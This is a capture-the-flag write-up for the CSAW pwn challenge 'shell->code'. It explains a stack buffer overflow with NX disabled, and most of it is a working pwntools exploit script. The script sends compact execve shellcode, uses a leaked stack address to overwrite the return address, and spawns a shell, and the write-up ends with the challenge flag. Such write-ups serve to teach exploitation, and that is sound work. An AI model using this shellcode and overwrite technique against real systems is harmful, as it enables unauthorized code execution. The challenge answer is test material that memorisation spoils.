## shell->code 100 (Pwn)

### Solution

The binary doesn't have NX enabled, it first ask for two 15 bytes input on stack, and then ouput the address of node2 on stack (leak), finally ask for your initials and has a 29 bytes buffer overflow.

For these 29 bytes, the return address starts at `buf+11` and we can easily overwrite then return to the shellcode on stack. The problem is that we have only 15 bytes for each buffer, not sufficient for a full `execve()` shellcode, and the leak comes after we input our shellcodes, so I can't chain the buffers together.

Finally I put "/bin/sh" after the return address, and making the shellcode fit inside 15 bytes.

### Exploit
```python
#!/usr/bin/env python3
from pwn import *
context(arch="amd64")

r = remote("pwn.chal.csaw.io", 9005)

sc = """
    mov rdi, rsp
    /* call execve('rsp', 0, 0) */
    push (SYS_execve) /* 0x3b */
    pop rax
    xor esi, esi /* 0 */
    cdq /* rdx=0 */
    syscall
"""
r.sendline(asm(sc))
r.sendline("x")
r.recvuntil("node.next: ")

leak = int(r.recv(14)[2:], 16)
r.sendline(b"a" * 11 + p64(leak + 0x28) + b"/bin/sh\x00")
r.interactive()
```

### Flag

```
flag{NONONODE_YOU_WRECKED_BRO}
```
